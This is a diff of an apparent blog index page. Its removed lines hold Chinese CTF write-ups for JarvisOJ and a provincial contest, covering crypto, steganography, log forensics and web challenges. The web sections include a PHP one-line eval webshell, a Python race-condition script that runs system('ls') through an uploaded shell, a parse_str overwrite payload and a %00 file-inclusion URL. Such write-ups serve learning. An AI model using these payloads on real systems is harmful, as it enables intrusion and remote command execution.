-<p>在for语句，可以知道到明文长度和密文长度相同，核心加密语句为第6，7行，算法使用ord函数取得明文每个字符的ASCII整型值，int函数内容为明文每个字符位置模40访问由调用sha1函数返回的40位16进制keySHA1字符串中的16进制数并转化为10进制数与由调用calc函数返回的整型值相减，然后将ord函数和int计算所得值作为密文添加到r列表，第7行更新intSHA1值，第9行转换为“-185-147-211…”格式并返回。 这里我们知道了密文cipherText，密钥key，加密算法encrypt，从而能逆推出解密算法，只要把密文值减去int函数中的值并对结果使用chr函数取得明文plain。</p>
-<p>贴别人的解密脚本：</p>
-<p>#coding:utf-8<br>#decrypt.py  </p>
-<p>import hashlib<br>​<br>def sha1(string):<br>    return hashlib.sha1(string).hexdigest()<br>​<br>def calc(strSHA1):<br>    r = 0<br>    for i in strSHA1:<br>        r += int(“0x%s” % i, 16)<br>    return r<br>​<br>def decrypt(strCipher,strKey):<br>    listCipher = map(lambda x: int(x),strCipher.replace(‘-‘,’ -‘)[1:].split(‘ ‘))<br>    strKeySHA1 = sha1(strKey)<br>    intSHA1 = calc(strKeySHA1)<br>    strPlain = ‘’<br>    for i in range(len(listCipher)):<br>        strPlain += chr(listCipher[i] + intSHA1 - int(“0x%s” % strKeySHA1[i%40],16))<br>        intSHA1 = calc(sha1(strPlain[:(i + 1)])[:20] + sha1(str(intSHA1))[:20])<br>    return strPlain<br>​<br>if __name__ == ‘__main__‘:<br>    strCipher= ‘-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164’<br>    strKey = ‘I_4m-k3y’<br>    strPlain = decrypt(strCipher, strKey)<br>print strPlain</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542894881625.png" alt></p>
-<p>这题还算是MISC吗…..真麻烦，要是不参考别人文章还真是搞不出来。</p>
-<p>参考：</p>
-<p><a href="https://blog.csdn.net/Magic1an/article/details/77418275" target="_blank" rel="noopener">https://blog.csdn.net/Magic1an/article/details/77418275</a></p>
-<p><a href="https://hackfun.org/2017/01/02/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E7%94%A8Python%E6%9D%A5%E5%81%9ACTF/" target="_blank" rel="noopener">https://hackfun.org/2017/01/02/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E7%94%A8Python%E6%9D%A5%E5%81%9ACTF/</a></p>
-
+          <h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a><strong>流量分析</strong></h3><p><strong>远程登录协议</strong></p><p>解法一：</p><p>过滤分组字节流搜索flag追踪到数据包</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542970759540.png" alt></p><p>解法二：</p><p>题目是：远程登录协议。所以过滤talnet协议定位，追踪流找到flag</p><p><strong>简单网管协议</strong></p><p>直接过滤分组字节流，找到flag。也可以过滤网管协议(SNMP)定位在追踪流找到。</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542970811954.png" alt></p><p><strong>struts2漏洞</strong></p><p>直接分组字节流过滤flag得俩：</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542852889256.png" alt></p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542852969079.png" alt></p><p>根据题目提示是大写MD5，得flag。</p>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/11/23/JarvisOJ-MISC:Wp/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1191,103 +743,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>第七届山东省网络安全技能大赛-决赛Write-Up ——xx_C1 <strong>前言</strong> 第一次真正意义打线下赛，学到不少东西。差点三等奖，继续努力吧。</p>
-<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h3><p>不会跳过</p>
-<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h3><p>不会跳过</p>
-<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h3><p><strong>web1</strong></p>
-<p>打开页面：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541500985254.png" alt></p>
-<p>猜测抓包伪造地址。同时把admin=0改为admin=1。只说IP不在范围这个和127.0.0.1貌似没什么关系…有点坑，卡了一小会儿。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541501098319.png" alt></p>
-<p><strong>Web2</strong></p>
-<p>简答的审计源码</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541591914800.png" alt></p>
-<p>危险函数：<code>parse_str()</code>存在变量覆盖漏洞。把aabg7XSsMD5加密后发现是0e开头。</p>
-<p>思路即构造?id=key[99]=QNKCDZO</p>
-<p>发现upl04d50m3thing.php，应该是个上传的页面。<img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541592065098.png" alt></p>
-<p>随便上传测试</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541592318489.png" alt></p>
-<p>下载后发现文件内容是<img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541592336126.png" alt></p>
-<p>猜测是条件竞争，后台处理：file_put_content，然后sleep(1)，echo ‘TooSlow’</p>
-<p>利用burp的intruder开多线程，利用延迟来竞争。一个上传，一个访问即可。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541686498221.png" alt></p>
-<p>看V0W的博客先上传一句话再利用py脚本重复访问竞争。</p>
-<p>贴V0W代码：</p>
-<p>import requests<br>​<br>url = ‘<a href="http://192.168.100.243:2002/uploads/e6ce11ded480d904ea8c3b30b00a23ab9bb59119/v.php&#39;//连接根据自身情况" target="_blank" rel="noopener">http://192.168.100.243:2002/uploads/e6ce11ded480d904ea8c3b30b00a23ab9bb59119/v.php&#39;//连接根据自身情况</a><br>​<br>postdata = {‘v’: “system(‘ls’);”} //‘v’根据自身传马情况<br>while True:<br> r = requests.post(url,data=postdata)<br> print r.text</p>
-<p><strong>Web3</strong></p>
-<p>SSTI第二次接触。过几天总结一下。</p>
-<h3 id="Crypoto"><a href="#Crypoto" class="headerlink" title="Crypoto"></a><strong>Crypoto</strong></h3><p><strong>rsa</strong></p>
-<p>思路一：分解大素数N(在线或yafu)，用已知的p，q，e通过模逆运算(可以直接调用pyhton里gmpy2模块的invert函数)求解e的逆元d。然后通过c的d次方对n取模的明文m。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541510704234.png" alt></p>
-<p>在线直接失败（当然了比赛不能在线）</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541511068271.png" alt></p>
-<p>yafu也失败了。</p>
-<p>思路二：上脚本秒解(当然得稍微改改他给的txt文档把N换成n，把enc换成c)</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541510945775.png" alt></p>
-<p>看了看这个脚本求N的模块，挺复杂的。应该是某几种算法结合。原理我真不知道…..总之感觉有时候工具都不如py脚本好用。得好好补补python…</p>
-<p><strong>affine</strong></p>
-<p>仿射变换解密。也用到了求解逆元算法..信安数基好好学挺重要…</p>
-<p>思路一：在线</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541513578405.png" alt></p>
-<p>手酸-8mod26的逆元为18！(当然比赛也不能在线)</p>
-<p>思路二：上脚本爆破解密</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541513252456.png" alt></p>
-<p>但是并不是所有的仿射加密都可以逆向解密，只有符合C = Ek(m) =(k1m + k2) mod n中gcd(k1, n) = 1时可以逆向解密。</p>
-<p>看了表哥们的wp才发现flag可以是加密。当然我也不是很清楚这个仿射加密和解密怎么都是一样呢？我测试了一下换个字符串</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541513485430.png" alt></p>
-<p>确实是一样的。回头又仔细看了看脚本，应该是属于解密。原理是直接通过仿射函数把对应密码表换了，不用爆破就可以解密。强大！</p>
-<p>通过爆破知道-8的逆元是18也可以直接进行在线解密了。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541513578405.png" alt></p>
-<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h3><p><strong>CrackIt</strong></p>
-<p>kali自带破解工具：john</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541514361982.png" alt></p>
-<p><strong>ada</strong></p>
-<p>binwalk查看带有一个zip，foremost分离得到加密的zip/</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541514509472.png" alt></p>
-<p>然后用图片的详细信息里面的16进制转为ascii即是密码。千万记住加0x！！！比赛卡了很长时间，我说的为什么不对！！！</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541514588159.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541514608206.png" alt></p>
-<p><strong>神秘的文件</strong></p>
-<p>一看样子就是明文攻击。唉…..说多了都是泪。没网，以前的工具也找不到了….干瞪眼吧！回学校一看，就算找到工具也不行！因为压缩那一步必须是WinRar软件(压缩算法和CRC一样即可)，而我用的是Bandzip…</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541673860055.png" alt></p>
-<p>用ARPR进行明文攻击。保存解出的zip。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541673909320.png" alt></p>
-<p>然后把docx后缀改成zip找到falg.txt</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541673984913.png" alt></p>
-<p>base64解密即可得flag。</p>
-<p><strong>basic</strong></p>
-<p>做过类似的题目，还存这脚本。135000不能开放也不是素数。就是不知道x，y…</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541587122184.png" alt></p>
-<p><strong>进制转换</strong></p>
-<p>比赛手撕…回来看看别人怎么写的python脚本，以后多练python…..</p>
-<p>import binascii<br>​<br>text = “d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e”<br>solution = ‘’<br>text2 = text.split(‘ ‘)<br>for x in text2:<br> print x<br> if x[0] == ‘b’: #binary<br> solution += chr(int(x[1:],2))<br> elif x[0] == ‘x’: # hexadecimal<br> solution += x[1:].decode(“hex”)<br> elif x[0] == ‘d’: # decimal<br> solution += chr(int(x[1:]))<br> elif x[0] == ‘o’: # octal<br> solution += chr(int(x[1:],8))<br>print solution</p>
-<p><strong>colors</strong></p>
-<p>用StegSolve打开每一张图片查看最低位通道发现hint：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541588702544.png" alt></p>
-<p>修改图片高度得到：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541589802902.png" alt></p>
-<p>联想二进制，黑-&gt;1,白-&gt;0。刚好七张图片，我们联想ascii码的可打印字符是7位二进制。所以必须竖读。写(贴)个python脚本得flag：</p>
-<p>#coding:utf-8<br>def encode(s):<br> return ‘ ‘.join([bin(ord(c)).replace(‘0b’, ‘’) for c in s])<br>def decode(s):<br> return ‘’.join([chr(i) for i in [int(b, 2) for b in s.split(‘ ‘)]])<br>​<br>l = [‘’] * 7<br>​<br>f = open(‘code.txt’, ‘r’) # 01矩阵<br>for i in range(7):<br> j = 0<br> line = f.readline().replace(‘\n’,’’)<br> l[i] = line<br># print l<br>​<br>## 矩阵初始化<br>ll=[‘’] * 20<br>for i in range(len(ll)):<br> ll[i]=[‘’] * 7<br>## 矩阵翻转<br>for i in range(20):<br> for j in range(7):<br> ll[i][j] = l[j][i]<br># print  ll<br>​<br>flag = ‘’<br>for i in ll:<br> t = ‘’.join(i)<br> flag += decode(t)</p>
-<p>print flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541590282485.png" alt></p>
-<h3 id="Forenisc"><a href="#Forenisc" class="headerlink" title="Forenisc"></a><strong>Forenisc</strong></h3><p><strong>日志分析</strong></p>
-<p>打开发现一堆sql注入的信息</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541590497012.png" alt></p>
-<p>我们先url decode，这里我用的burpsuite挺方便的。这样手撕起来就比较好看了。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541590565946.png" alt></p>
-<p>发现是sql盲注二分查找，根据返回404还是200直接判断就好了。25个字符还好，手撕比脚本快一点吧。</p>
-<p>附(贴)python判断脚本</p>
-<p># coding:utf-8<br>import re<br>import urllib<br>​<br>f = open(‘access.log’,’r’)<br>lines = f.readlines()<br>datas = []for line in lines:<br> t = urllib.unquote(line)<br> if ‘1765’ in t and ‘flag’ in t:  # 过滤出与flag相关，正确的猜解<br> datas.append(t)<br>​<br>flag_ascii = {}<br>for data in datas:<br> matchObj = re.search( r’LIMIT 0,1\),(.<em>?),1\)\)&gt;(.</em>?) AND’, data)<br> if matchObj:<br> key = int(matchObj.group(1))<br> value = int(matchObj.group(2))+1<br> flag_ascii[key] = value     # 使用字典，保存最后一次猜解正确的ascii码</p>
-<p>flag = ‘’<br>for value in flag_ascii.values():<br> flag += chr(value)</p>
-<p>print flag</p>
-<p><strong>特殊后门</strong></p>
-<p>提示特殊协议，过滤搜索flag找到了ICMP协议。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541591383631.png" alt></p>
-<p>之后把后面的一个个手撕拼接OK。</p>
-<p><strong>weblogic</strong></p>
-<p>搜索hostname定位过滤，追踪HTTP流再搜索hostname。hint：16进制</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541591777085.png" alt></p>
-
+          <p>第七届山东省网络安全技能大赛-决赛Write-Up ——xx_C1 <strong>前言</strong> 第一次真正意义打线下赛，学到不少东西。差点三等奖，继续努力吧。</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h3><p>不会跳过</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h3><p>不会跳过</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h3><p><strong>web1</strong></p><p>打开页面：</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1541500985254.png" alt></p><p>猜测抓包伪造地址。同时把admin=0改为admin=1。只说IP不在范围这个和127.0.0.1貌似没什么关系…有点坑，卡了一小会儿。</p>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/11/09/第七届山东省网络安全技能大赛-决赛Write-Up/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1409,65 +874,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><strong>WEB?</strong></p>
-<p>这个题目一看一脸懵逼。注入扫目录都没结果。查看源码发现有俩连接很诡异。既然题目提示web？可能就在此下手了。</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871486986-300x63.png" alt> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871501080-300x63.png" alt></p>
-<p>打开后一看是这么一堆：</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871544383-300x160.png" alt></p>
-<p>先找个js代码格式工具格式一下。既然是js代码就根据前端有什么就搜什么吧。 <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871853951-300x158.png" alt> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872024529-300x169.png" alt> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871983502-300x55.png" alt></p>
-<p>搜索Wrong Password。发现一个checkpass函数。</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872134577-300x86.png" alt></p>
-<p>搜索chekpass发现这么一堆：</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872325014-300x228.png" alt></p>
-<p>我也不是很懂。。。谷歌后发现是一个25元方程组，利用python里面pumpy模块可以直接求解。猜测应该解出来就是password了。</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872403593-300x59.png" alt></p>
-<p>得到flag。果然不是web题目。。。。</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872489815-300x280.png" alt></p>
-<p>关于这个numpy模块查了一下貌似很强大，可以解很多矩阵。很多密码题目可能用到。</p>
-<p><strong>PHPINFO</strong></p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872639882-300x166.png" alt></p>
-<p>其实一上来我以为很简单。一看这就是反序列化。之前总结过然而貌似是另外一种反序列化类型：Session序列化及反序列化处理器的安全问题。下篇文章总结一下。</p>
-<p>根据源码理解，直接get传入phpinfo会直接能看到php设置。可能存在很多有用的信息。</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872719460-300x166.png" alt></p>
-<p>然后就貌似不会了。。谷歌后发现这是：Session序列化及反序列化处理器的安全问题。其实重点在于这段代码：</p>
-<p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
-<p>其意思是设置php序列化及反序列化时使用的处理器为php。</p>
-<p>关于php处理器：</p>
-<p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化：</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872893149-300x90.png" alt></p>
-<p>而php.ini中默认session.serialize_handler为php_serialize。这就会带来安全问题。</p>
-<p>简单来说就是：</p>
-<p>$_SESSION 数据，在存储时使用的序列化处理器为 php_serialize</p>
-<p>读取数据时如果用的反序列化处理器不是 php_serialize，而是 php</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873050018-300x33.png" alt></p>
-<p>发现可以利用反序列化带入可执行数据到session中。</p>
-<p>构造序列化值，本地搭建环境构造表单上传文件,再查询文件目录。代码如下：</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873206862-300x184.png" alt> 在本地搭建环境访问构造的页面抓包上传我们的序列化payload。 <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873357851-300x119.png" alt></p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873418829-300x208.png" alt></p>
-<p>注意要在前面加| 并且要用转译”符号。</p>
-<p>得到了一个文件： <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873476151-300x130.png" alt></p>
-<p>然后仿照上面操作访问这个文件。</p>
-<p> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873504656-300x187.png" alt></p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539873520477-300x67.png" alt></p>
-<p>得到flag。具体关于反序列化第二种情况上篇文章详细说明了。</p>
-<p><strong>Easy Gallery</strong></p>
-<p>发现有个上传页面，直接上传小马。这个马经过验证需要绕过马（这个php7.0后就不可以用了）：</p>
-<script language="php">@eval\_r($\_POST\[sb\])</script> 
-
-<p>通过在<code>view</code>里面输入图片ID和图片类型发现图片链接为：</p>
-<p><code>http://web.jarvisoj.com:32785/uploads/show.php?id=xxx&amp;type=jpg</code></p>
-<p>查看源码得到绝对地址</p>
-<p><a href="http://web.jarvisoj.com:32785/uploads/图片ID.jpg" target="_blank" rel="noopener">http://web.jarvisoj.com:32785/uploads/图片ID.jpg</a></p>
-<p>得到图片地址：uploads/1539874317.jpg通过url访问：</p>
-<p><code>http://web.jarvisoj.com:32785/index.php?page=uploads/1539874317.jpg</code></p>
-<p>回显错误：</p>
-<p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539874593949-300x101.png" alt></p>
-<p>查看他给自动加上了.php。直接%00截断访问：</p>
-<p><code>http://web.jarvisoj.com:32785/index.php?page=uploads/1539874317.jpg%00</code></p>
-<p>得到flag：</p>
-<p>  <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539874650025-300x82.png" alt></p>
-<p>一般来讲ctf不用菜刀连接直接post命令ls可以获得flag。当然连接也可以。</p>
-
+          <p><strong>WEB?</strong></p><p>这个题目一看一脸懵逼。注入扫目录都没结果。查看源码发现有俩连接很诡异。既然题目提示web？可能就在此下手了。</p><p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871486986-300x63.png" alt> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871501080-300x63.png" alt></p><p>打开后一看是这么一堆：</p><p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871544383-300x160.png" alt></p><p>先找个js代码格式工具格式一下。既然是js代码就根据前端有什么就搜什么吧。 <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871853951-300x158.png" alt> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872024529-300x169.png" alt> <img src="http://dxxblog.top/wp-content/uploads/2018/10/1539871983502-300x55.png" alt></p><p>搜索Wrong Password。发现一个checkpass函数。</p><p><img src="http://dxxblog.top/wp-content/uploads/2018/10/1539872134577-300x86.png" alt></p><p>搜索chekpass发现这么一堆：</p>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/10/18/jarvisoj-webwp-3/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
